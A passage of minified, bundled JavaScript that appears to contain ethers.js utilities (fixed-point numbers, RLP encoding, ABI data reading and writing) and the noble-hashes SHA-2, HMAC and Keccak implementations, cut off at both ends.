n=e.match(/^(-?)([0-9]*)\.?([0-9]*)$/);M(n&&n[2].length+n[3].length>0,"invalid FixedNumber string value","value",e);const i=Em(r);let s=n[2]||"0",o=n[3]||"";for(;o.length<i.decimals;)o+=Gl;K(o.substring(i.decimals).match(/^0*$/),"too many decimals for format","NUMERIC_FAULT",{operation:"fromString",fault:"underflow",value:e}),o=o.substring(0,i.decimals);const a=BigInt(n[1]+s+o);return rd(a,i,"fromString"),new ho(wl,a,i)}static fromBytes(e,r){let n=y1(Ve(e,"value"));const i=Em(r);return i.signed&&(n=yg(n,i.width)),rd(n,i,"fromBytes"),new ho(wl,n,i)}};oi=new WeakMap,st=new WeakMap,Er=new WeakMap,et=new WeakSet,va=function(e){M(this.format===e.format,"incompatible format; use fixedNumber.toFormat","other",e)},fs=function(e,r){return e=rd(e,A(this,oi),r),new ho(wl,e,A(this,oi))},Zy=function(e,r){return Q(this,et,va).call(this,e),Q(this,et,fs).call(this,A(this,st)+A(e,st),r)},Jy=function(e,r){return Q(this,et,va).call(this,e),Q(this,et,fs).call(this,A(this,st)-A(e,st),r)},Qy=function(e,r){return Q(this,et,va).call(this,e),Q(this,et,fs).call(this,A(this,st)*A(e,st)/A(this,Er),r)},Yy=function(e,r){return K(A(e,st)!==ei,"division by zero","NUMERIC_FAULT",{operation:"div",fault:"divide-by-zero",value:this}),Q(this,et,va).call(this,e),Q(this,et,fs).call(this,A(this,st)*A(this,Er)/A(e,st),r)};let Ky=ho;function MY(t){let e=t.toString(16);for(;e.length<2;)e="0"+e;return"0x"+e}function z8(t,e,r){let n=0;for(let i=0;i<r;i++)n=n*256+t[e+i];return n}function j8(t,e,r,n){const i=[];for(;r<e+1+n;){const s=sx(t,r);i.push(s.result),r+=s.consumed,K(r<=e+1+n,"child data too short","BUFFER_OVERRUN",{buffer:t,length:n,offset:e})}return{consumed:1+n,result:i}}function sx(t,e){K(t.length!==0,"data too short","BUFFER_OVERRUN",{buffer:t,length:0,offset:1});const r=n=>{K(n<=t.length,"data short segment too short","BUFFER_OVERRUN",{buffer:t,length:t.length,offset:n})};if(t[e]>=248){const n=t[e]-247;r(e+1+n);const i=z8(t,e+1,n);return r(e+1+n+i),j8(t,e,e+1+n,n+i)}else if(t[e]>=192){const n=t[e]-192;return r(e+1+n),j8(t,e,e+1,n)}else if(t[e]>=184){const n=t[e]-183;r(e+1+n);const i=z8(t,e+1,n);r(e+1+n+i);const s=ue(t.slice(e+1+n,e+1+n+i));return{consumed:1+n+i,result:s}}else if(t[e]>=128){const n=t[e]-128;r(e+1+n);const i=ue(t.slice(e+1,e+1+n));return{consumed:1+n,result:i}}return{consumed:1,result:MY(t[e])}}function b1(t){const e=Ve(t,"data"),r=sx(e,0);return M(r.consumed===e.length,"unexpected junk after rlp payload","data",t),r.result}function H8(t){const e=[];for(;t;)e.unshift(t&255),t>>=8;return e}function ox(t){if(Array.isArray(t)){let n=[];if(t.forEach(function(s){n=n.concat(ox(s))}),n.length<=55)return n.unshift(192+n.length),n;const i=H8(n.length);return i.unshift(247+i.length),i.concat(n)}const e=Array.prototype.slice.call(Ve(t,"object"));if(e.length===1&&e[0]<=127)return e;if(e.length<=55)return e.unshift(128+e.length),e;const r=H8(e.length);return r.unshift(183+r.length),r.concat(e)}const q8="0123456789abcdef";function Oc(t){let e="0x";for(const r of ox(t))e+=q8[r>>4],e+=q8[r&15];return e}function FY(t,e){let r=18;return r=Re(e,"unit"),Ky.fromValue(t,r,{decimals:r,width:512}).toString()}const Sr=32,Xy=new Uint8Array(Sr),zY=["then"],E0={},ax=new WeakMap;function Pa(t){return ax.get(t)}function V8(t,e){ax.set(t,e)}function nd(t,e){const r=new Error(`deferred error during ABI decoding triggered accessing ${t}`);throw r.error=e,r}function eb(t,e,r){return t.indexOf(null)>=0?e.map((n,i)=>n instanceof Yu?eb(Pa(n),n,r):n):t.reduce((n,i,s)=>{let o=e.getValue(i);return i in n||(r&&o instanceof Yu&&(o=eb(Pa(o),o,r)),n[i]=o),n},{})}var ru;const Fl=class Fl extends Array{constructor(...r){const n=r[0];let i=r[1],s=(r[2]||[]).slice(),o=!0;n!==E0&&(i=r,s=[],o=!1);super(i.length);H(this,ru);i.forEach((l,u)=>{this[u]=l});const a=s.reduce((l,u)=>(typeof u=="string"&&l.set(u,(l.get(u)||0)+1),l),new Map);if(V8(this,Object.freeze(i.map((l,u)=>{const h=s[u];return h!=null&&a.get(h)===1?h:null}))),$(this,ru,[]),A(this,ru)==null&&A(this,ru),!o)return;Object.freeze(this);const c=new Proxy(this,{get:(l,u,h)=>{if(typeof u=="string"){if(u.match(/^[0-9]+$/)){const f=Re(u,"%index");if(f<0||f>=this.length)throw new RangeError("out of result range");const g=l[f];return g instanceof Error&&nd(`index ${f}`,g),g}if(zY.indexOf(u)>=0)return Reflect.get(l,u,h);const d=l[u];if(d instanceof Function)return function(...f){return d.apply(this===h?l:this,f)};if(!(u in l))return l.getValue.apply(this===h?l:this,[u])}return Reflect.get(l,u,h)}});return V8(c,Pa(this)),c}toArray(r){const n=[];return this.forEach((i,s)=>{i instanceof Error&&nd(`index ${s}`,i),r&&i instanceof Fl&&(i=i.toArray(r)),n.push(i)}),n}toObject(r){const n=Pa(this);return n.reduce((i,s,o)=>(K(s!=null,`value at index ${o} unnamed`,"UNSUPPORTED_OPERATION",{operation:"toObject()"}),eb(n,this,r)),{})}slice(r,n){r==null&&(r=0),r<0&&(r+=this.length,r<0&&(r=0)),n==null&&(n=this.length),n<0&&(n+=this.length,n<0&&(n=0)),n>this.length&&(n=this.length);const i=Pa(this),s=[],o=[];for(let a=r;a<n;a++)s.push(this[a]),o.push(i[a]);return new Fl(E0,s,o)}filter(r,n){const i=Pa(this),s=[],o=[];for(let a=0;a<this.length;a++){const c=this[a];c instanceof Error&&nd(`index ${a}`,c),r.call(n,c,a,this)&&(s.push(c),o.push(i[a]))}return new Fl(E0,s,o)}map(r,n){const i=[];for(let s=0;s<this.length;s++){const o=this[s];o instanceof Error&&nd(`index ${s}`,o),i.push(r.call(n,o,s,this))}return i}getValue(r){const n=Pa(this).indexOf(r);if(n===-1)return;const i=this[n];return i instanceof Error&&nd(`property ${JSON.stringify(r)}`,i.error),i}static fromItems(r,n){return new Fl(E0,r,n)}};ru=new WeakMap;let Yu=Fl;function W8(t){let e=Ir(t);return K(e.length<=Sr,"value out-of-bounds","BUFFER_OVERRUN",{buffer:e,length:Sr,offset:e.length}),e.length!==Sr&&(e=xr(Ot([Xy.slice(e.length%Sr),e]))),e}class Vs{constructor(e,r,n,i){j(this,"name");j(this,"type");j(this,"localName");j(this,"dynamic");Ce(this,{name:e,type:r,localName:n,dynamic:i},{name:"string",type:"string",localName:"string",dynamic:"boolean"})}_throwError(e,r){M(!1,e,this.localName,r)}}var Cs,Wa,nu,U0;class tb{constructor(){H(this,nu);H(this,Cs);H(this,Wa);$(this,Cs,[]),$(this,Wa,0)}get data(){return Ot(A(this,Cs))}get length(){return A(this,Wa)}appendWriter(e){return Q(this,nu,U0).call(this,xr(e.data))}writeBytes(e){let r=xr(e);const n=r.length%Sr;return n&&(r=xr(Ot([r,Xy.slice(n)]))),Q(this,nu,U0).call(this,r)}writeValue(e){return Q(this,nu,U0).call(this,W8(e))}writeUpdatableValue(){const e=A(this,Cs).length;return A(this,Cs).push(Xy),$(this,Wa,A(this,Wa)+Sr),r=>{A(this,Cs)[e]=W8(r)}}}Cs=new WeakMap,Wa=new WeakMap,nu=new WeakSet,U0=function(e){return A(this,Cs).push(e),$(this,Wa,A(this,Wa)+e.length),e.length};var zr,un,Ga,Ka,mo,Dc,nb,cx;const K2=class K2{constructor(e,r,n){H(this,Dc);j(this,"allowLoose");H(this,zr);H(this,un);H(this,Ga);H(this,Ka);H(this,mo);Ce(this,{allowLoose:!!r}),$(this,zr,xr(e)),$(this,Ga,0),$(this,Ka,null),$(this,mo,n??1024),$(this,un,0)}get data(){return ue(A(this,zr))}get dataLength(){return A(this,zr).length}get consumed(){return A(this,un)}get bytes(){return new Uint8Array(A(this,zr))}subReader(e){const r=new K2(A(this,zr).slice(A(this,un)+e),this.allowLoose,A(this,mo));return $(r,Ka,this),r}readBytes(e,r){let n=Q(this,Dc,cx).call(this,0,e,!!r);return Q(this,Dc,nb).call(this,e),$(this,un,A(this,un)+n.length),n.slice(0,e)}readValue(){return y1(this.readBytes(Sr))}readIndex(){return vY(this.readBytes(Sr))}};zr=new WeakMap,un=new WeakMap,Ga=new WeakMap,Ka=new WeakMap,mo=new WeakMap,Dc=new WeakSet,nb=function(e){var r;if(A(this,Ka))return Q(r=A(this,Ka),Dc,nb).call(r,e);$(this,Ga,A(this,Ga)+e),K(A(this,mo)<1||A(this,Ga)<=A(this,mo)*this.dataLength,`compressed ABI data exceeds inflation ratio of ${A(this,mo)} ( see: https://github.com/ethers-io/ethers.js/issues/4537 )`,"BUFFER_OVERRUN",{buffer:xr(A(this,zr)),offset:A(this,un),length:e,info:{bytesRead:A(this,Ga),dataLength:this.dataLength}})},cx=function(e,r,n){let i=Math.ceil(r/Sr)*Sr;return A(this,un)+i>A(this,zr).length&&(this.allowLoose&&n&&A(this,un)+r<=A(this,zr).length?i=r:K(!1,"data out-of-bounds","BUFFER_OVERRUN",{buffer:xr(A(this,zr)),length:A(this,zr).length,offset:A(this,un)+i})),A(this,zr).slice(A(this,un),A(this,un)+i)};let rb=K2;function vg(t){if(!Number.isSafeInteger(t)||t<0)throw new Error(`Wrong positive integer: ${t}`)}function N2(t,...e){if(!(t instanceof Uint8Array))throw new Error("Expected Uint8Array");if(e.length>0&&!e.includes(t.length))throw new Error(`Expected Uint8Array of length ${e}, not of length=${t.length}`)}function jY(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");vg(t.outputLen),vg(t.blockLen)}function Xu(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function lx(t,e){N2(t);const r=e.outputLen;if(t.length<r)throw new Error(`digestInto() expects output buffer of length at least ${r}`)}const Cm=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */const ux=t=>t instanceof Uint8Array,HY=t=>new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4)),Am=t=>new DataView(t.buffer,t.byteOffset,t.byteLength),Si=(t,e)=>t<<32-e|t>>>e,qY=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;if(!qY)throw new Error("Non little-endian hardware is not supported");function VY(t){if(typeof t!="string")throw new Error(`utf8ToBytes expected string, got ${typeof t}`);return new Uint8Array(new TextEncoder().encode(t))}function v1(t){if(typeof t=="string"&&(t=VY(t)),!ux(t))throw new Error(`expected Uint8Array, got ${typeof t}`);return t}function WY(...t){const e=new Uint8Array(t.reduce((n,i)=>n+i.length,0));let r=0;return t.forEach(n=>{if(!ux(n))throw new Error("Uint8Array expected");e.set(n,r),r+=n.length}),e}class P2{clone(){return this._cloneInto()}}function k2(t){const e=n=>t().update(v1(n)).digest(),r=t();return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=()=>t(),e}function GY(t=32){if(Cm&&typeof Cm.getRandomValues=="function")return Cm.getRandomValues(new Uint8Array(t));throw new Error("crypto.getRandomValues must be defined")}class hx extends P2{constructor(e,r){super(),this.finished=!1,this.destroyed=!1,jY(e);const n=v1(r);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const i=this.blockLen,s=new Uint8Array(i);s.set(n.length>i?e.create().update(n).digest():n);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),s.fill(0)}update(e){return Xu(this),this.iHash.update(e),this}digestInto(e){Xu(this),N2(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:r,iHash:n,finished:i,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=i,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=r._cloneInto(e.oHash),e.iHash=n._cloneInto(e.iHash),e}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}}const dx=(t,e,r)=>new hx(t,e).update(r).digest();dx.create=(t,e)=>new hx(t,e);function KY(t,e,r,n){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,r,n);const i=BigInt(32),s=BigInt(4294967295),o=Number(r>>i&s),a=Number(r&s),c=n?4:0,l=n?0:4;t.setUint32(e+c,o,n),t.setUint32(e+l,a,n)}class fx extends P2{constructor(e,r,n,i){super(),this.blockLen=e,this.outputLen=r,this.padOffset=n,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=Am(this.buffer)}update(e){Xu(this);const{view:r,buffer:n,blockLen:i}=this;e=v1(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const c=Am(e);for(;i<=s-o;o+=i)this.process(c,o);continue}n.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(r,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){Xu(this),lx(e,this),this.finished=!0;const{buffer:r,view:n,blockLen:i,isLE:s}=this;let{pos:o}=this;r[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>i-o&&(this.process(n,0),o=0);for(let h=o;h<i;h++)r[h]=0;KY(n,i-8,BigInt(this.length*8),s),this.process(n,0);const a=Am(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,u=this.get();if(l>u.length)throw new Error("_sha2: outputLen bigger than state");for(let h=0;h<l;h++)a.setUint32(4*h,u[h],s)}digest(){const{buffer:e,outputLen:r}=this;this.digestInto(e);const n=e.slice(0,r);return this.destroy(),n}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:r,buffer:n,length:i,finished:s,destroyed:o,pos:a}=this;return e.length=i,e.pos=a,e.finished=s,e.destroyed=o,i%r&&e.buffer.set(n),e}}const ZY=(t,e,r)=>t&e^~t&r,JY=(t,e,r)=>t&e^t&r^e&r,QY=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),ro=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),no=new Uint32Array(64);class YY extends fx{constructor(){super(64,32,8,!1),this.A=ro[0]|0,this.B=ro[1]|0,this.C=ro[2]|0,this.D=ro[3]|0,this.E=ro[4]|0,this.F=ro[5]|0,this.G=ro[6]|0,this.H=ro[7]|0}get(){const{A:e,B:r,C:n,D:i,E:s,F:o,G:a,H:c}=this;return[e,r,n,i,s,o,a,c]}set(e,r,n,i,s,o,a,c){this.A=e|0,this.B=r|0,this.C=n|0,this.D=i|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,r){for(let h=0;h<16;h++,r+=4)no[h]=e.getUint32(r,!1);for(let h=16;h<64;h++){const d=no[h-15],f=no[h-2],g=Si(d,7)^Si(d,18)^d>>>3,p=Si(f,17)^Si(f,19)^f>>>10;no[h]=p+no[h-7]+g+no[h-16]|0}let{A:n,B:i,C:s,D:o,E:a,F:c,G:l,H:u}=this;for(let h=0;h<64;h++){const d=Si(a,6)^Si(a,11)^Si(a,25),f=u+d+ZY(a,c,l)+QY[h]+no[h]|0,p=(Si(n,2)^Si(n,13)^Si(n,22))+JY(n,i,s)|0;u=l,l=c,c=a,a=o+f|0,o=s,s=i,i=n,n=f+p|0}n=n+this.A|0,i=i+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,l=l+this.G|0,u=u+this.H|0,this.set(n,i,s,o,a,c,l,u)}roundClean(){no.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}}const px=k2(()=>new YY),C0=BigInt(2**32-1),ib=BigInt(32);function gx(t,e=!1){return e?{h:Number(t&C0),l:Number(t>>ib&C0)}:{h:Number(t>>ib&C0)|0,l:Number(t&C0)|0}}function wx(t,e=!1){let r=new Uint32Array(t.length),n=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:s,l:o}=gx(t[i],e);[r[i],n[i]]=[s,o]}return[r,n]}const XY=(t,e)=>BigInt(t>>>0)<<ib|BigInt(e>>>0),eX=(t,e,r)=>t>>>r,tX=(t,e,r)=>t<<32-r|e>>>r,rX=(t,e,r)=>t>>>r|e<<32-r,nX=(t,e,r)=>t<<32-r|e>>>r,iX=(t,e,r)=>t<<64-r|e>>>r-32,sX=(t,e,r)=>t>>>r-32|e<<64-r,oX=(t,e)=>e,aX=(t,e)=>t,mx=(t,e,r)=>t<<r|e>>>32-r,yx=(t,e,r)=>e<<r|t>>>32-r,bx=(t,e,r)=>e<<r-32|t>>>64-r,vx=(t,e,r)=>t<<r-32|e>>>64-r;function cX(t,e,r,n){const i=(e>>>0)+(n>>>0);return{h:t+r+(i/2**32|0)|0,l:i|0}}const lX=(t,e,r)=>(t>>>0)+(e>>>0)+(r>>>0),uX=(t,e,r,n)=>e+r+n+(t/2**32|0)|0,hX=(t,e,r,n)=>(t>>>0)+(e>>>0)+(r>>>0)+(n>>>0),dX=(t,e,r,n,i)=>e+r+n+i+(t/2**32|0)|0,fX=(t,e,r,n,i)=>(t>>>0)+(e>>>0)+(r>>>0)+(n>>>0)+(i>>>0),pX=(t,e,r,n,i,s)=>e+r+n+i+s+(t/2**32|0)|0,$e={fromBig:gx,split:wx,toBig:XY,shrSH:eX,shrSL:tX,rotrSH:rX,rotrSL:nX,rotrBH:iX,rotrBL:sX,rotr32H:oX,rotr32L:aX,rotlSH:mx,rotlSL:yx,rotlBH:bx,rotlBL:vx,add:cX,add3L:lX,add3H:uX,add4L:hX,add4H:dX,add5H:pX,add5L:fX},[gX,wX]=$e.split(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(t=>BigInt(t))),io=new Uint32Array(80),so=new Uint32Array(80);class mX extends fx{constructor(){super(128,64,16,!1),this.Ah=1779033703,this.Al=-205731576,this.Bh=-1150833019,this.Bl=-2067093701,this.Ch=1013904242,this.Cl=-23791573,this.Dh=-1521486534,this.Dl=1595750129,this.Eh=1359893119,this.El=-1377402159,this.Fh=-1694144372,this.Fl=725511199,this.Gh=528734635,this.Gl=-79577749,this.Hh=1541459225,this.Hl=327033209}get(){const{Ah:e,Al:r,Bh:n,Bl:i,Ch:s,Cl:o,Dh:a,Dl:c,Eh:l,El:u,Fh:h,Fl:d,Gh:f,Gl:g,Hh:p,Hl:w}=this;return[e,r,n,i,s,o,a,c,l,u,h,d,f,g,p,w]}set(e,r,n,i,s,o,a,c,l,u,h,d,f,g,p,w){this.Ah=e|0,this.Al=r|0,this.Bh=n|0,this.Bl=i|0,this.Ch=s|0,this.Cl=o|0,this.Dh=a|0,this.Dl=c|0,this.Eh=l|0,this.El=u|0,this.Fh=h|0,this.Fl=d|0,this.Gh=f|0,this.Gl=g|0,this.Hh=p|0,this.Hl=w|0}process(e,r){for(let v=0;v<16;v++,r+=4)io[v]=e.getUint32(r),so[v]=e.getUint32(r+=4);for(let v=16;v<80;v++){const x=io[v-15]|0,I=so[v-15]|0,C=$e.rotrSH(x,I,1)^$e.rotrSH(x,I,8)^$e.shrSH(x,I,7),N=$e.rotrSL(x,I,1)^$e.rotrSL(x,I,8)^$e.shrSL(x,I,7),S=io[v-2]|0,P=so[v-2]|0,T=$e.rotrSH(S,P,19)^$e.rotrBH(S,P,61)^$e.shrSH(S,P,6),D=$e.rotrSL(S,P,19)^$e.rotrBL(S,P,61)^$e.shrSL(S,P,6),z=$e.add4L(N,D,so[v-7],so[v-16]),V=$e.add4H(z,C,T,io[v-7],io[v-16]);io[v]=V|0,so[v]=z|0}let{Ah:n,Al:i,Bh:s,Bl:o,Ch:a,Cl:c,Dh:l,Dl:u,Eh:h,El:d,Fh:f,Fl:g,Gh:p,Gl:w,Hh:m,Hl:b}=this;for(let v=0;v<80;v++){const x=$e.rotrSH(h,d,14)^$e.rotrSH(h,d,18)^$e.rotrBH(h,d,41),I=$e.rotrSL(h,d,14)^$e.rotrSL(h,d,18)^$e.rotrBL(h,d,41),C=h&f^~h&p,N=d&g^~d&w,S=$e.add5L(b,I,N,wX[v],so[v]),P=$e.add5H(S,m,x,C,gX[v],io[v]),T=S|0,D=$e.rotrSH(n,i,28)^$e.rotrBH(n,i,34)^$e.rotrBH(n,i,39),z=$e.rotrSL(n,i,28)^$e.rotrBL(n,i,34)^$e.rotrBL(n,i,39),V=n&s^n&a^s&a,O=i&o^i&c^o&c;m=p|0,b=w|0,p=f|0,w=g|0,f=h|0,g=d|0,{h,l:d}=$e.add(l|0,u|0,P|0,T|0),l=a|0,u=c|0,a=s|0,c=o|0,s=n|0,o=i|0;const y=$e.add3L(T,z,O);n=$e.add3H(y,P,D,V),i=y|0}({h:n,l:i}=$e.add(this.Ah|0,this.Al|0,n|0,i|0)),{h:s,l:o}=$e.add(this.Bh|0,this.Bl|0,s|0,o|0),{h:a,l:c}=$e.add(this.Ch|0,this.Cl|0,a|0,c|0),{h:l,l:u}=$e.add(this.Dh|0,this.Dl|0,l|0,u|0),{h,l:d}=$e.add(this.Eh|0,this.El|0,h|0,d|0),{h:f,l:g}=$e.add(this.Fh|0,this.Fl|0,f|0,g|0),{h:p,l:w}=$e.add(this.Gh|0,this.Gl|0,p|0,w|0),{h:m,l:b}=$e.add(this.Hh|0,this.Hl|0,m|0,b|0),this.set(n,i,s,o,a,c,l,u,h,d,f,g,p,w,m,b)}roundClean(){io.fill(0),so.fill(0)}destroy(){this.buffer.fill(0),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}}const yX=k2(()=>new mX);function bX(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("unable to locate global object")}const G8=bX();G8.crypto||G8.msCrypto;function vX(t){switch(t){case"sha256":return px.create();case"sha512":return yX.create()}M(!1,"invalid hashing algorithm name","algorithm",t)}const[Ex,Cx,Ax]=[[],[],[]],EX=BigInt(0),id=BigInt(1),CX=BigInt(2),AX=BigInt(7),xX=BigInt(256),IX=BigInt(113);for(let t=0,e=id,r=1,n=0;t<24;t++){[r,n]=[n,(2*r+3*n)%5],Ex.push(2*(5*n+r)),Cx.push((t+1)*(t+2)/2%64);let i=EX;for(let s=0;s<7;s++)e=(e<<id^(e>>AX)*IX)%xX,e&CX&&(i^=id<<(id<<BigInt(s))-id);Ax.push(i)}const[SX,NX]=wx(Ax,!0),K8=(t,e,r)=>r>32?bx(t,e,r):mx(t,e,r),Z8=(t,e,r)=>r>32?vx(t,e,r):yx(t,e,r);function PX(t,e=24){const r=new Uint32Array(10);for(let n=24-e;n<24;n++){for(let o=0;o<10;o++)r[o]=t[o]^t[o+10]^t[o+20]^t[o+30]^t[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,l=r[c],u=r[c+1],h=K8(l,u,1)^r[a],d=Z8(l,u,1)^r[a+1];for(let f=0;f<50;f+=10)t[o+f]^=h,t[o+f+1]^=d}let i=t[2],s=t[3];for(let o=0;o<24;o++){const a=Cx[o],c=K8(i,s,a),l=Z8(i,s,a),u=Ex[o];i=t[u],s=t[u+1],t[u]=c,t[u+1]=l}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)r[a]=t[o+a];for(let a=0;a<10;a++)t[o+a]^=~r[(a+2)%10]&r[(a+4)%10]}t[0]^=SX[n],t[1]^=NX[n]}r.fill(0)}class O2 extends P2{constructor(e,r,n,i=!1,s=24){if(super(),this.blockLen=e,this.suffix=r,this.outputLen=n,this.enableXOF=i,this.rounds=s,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,vg(n),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=HY(this.state)}keccak(){PX(this.state32,this.rounds),this.posOut=0,this.pos=0}update(e){Xu(this);const{blockLen:r,state:n}=this;e=v1(e);const i=e.length;for(let s=0;s<i;){const o=Math.min(r-this.pos,i-s);for(let a=0;a<o;a++)n[this.pos++]^=e[s++];this.pos===r&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:r,pos:n,blockLen:i}=this;e[n]^=r,(r&128)!==0&&n===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){Xu(this,!1),N2(e),this.finish();const r=this.state,{blockLen:n}=this;for(let i=0,s=e.length;i<s;){this.posOut>=n&&this.keccak();const o=Math.min(n-this.posOut,s-i);e.set(r.subarray(this.posOut,this.posOut+o),i),this.posOut+=o,i+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return vg(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(lx(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:r,suffix:n,outputLen:i,rounds:s,enableXOF:o}=this;return e||(e=new O2(r,n,i,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=n,e.outputLen=i,e.enableXOF=o,e.destroyed=this.destroyed,e}}const kX=(t,e,r)=>k2(()=>new O2(e,t,r)),OX=kX(1,136,256/8);let xx=!1;const Ix=function(t){return OX(t)};let Sx=Ix;function $t(t){const e=Ve(t,"data");return ue(Sx(e))}$t._=Ix;$t.lock=function(){xx=!0};$t.register=function(t){if(xx)throw new TypeError("keccak256 is locked");Sx=t};Object.freeze($t);const Nx=function(t){return vX("sha256").update(t).digest()};let Px=Nx,kx=!1;function wh(t){const e=Ve(t,"data");return ue(Px(e))}wh._=Nx;wh.lock=function(){kx=!0};wh.register=function(t){if(kx)throw new Error("sha256 is locked");Px=t};Object.freeze(wh);Object.freeze(wh);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Ox=BigInt(0),E1=BigInt(1),_X=BigInt(2),C1=t=>t instanceof Uint8Array,TX=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function eh(t){if(!C1(t))throw new Error("Uint8Array expected");let e="";for(let r=0;r<t.length;r++)e+=TX[t[r]];return e}function _x(t){const e=t.toString(16);return e.length&1?`0${e}`:e}function _2(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return BigInt(t===""?"0":`0x${t}`)}function th(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);const e=t.length;if(e%2)throw new Error("padded hex string expected, got unpadded hex of length "+e);const r=new 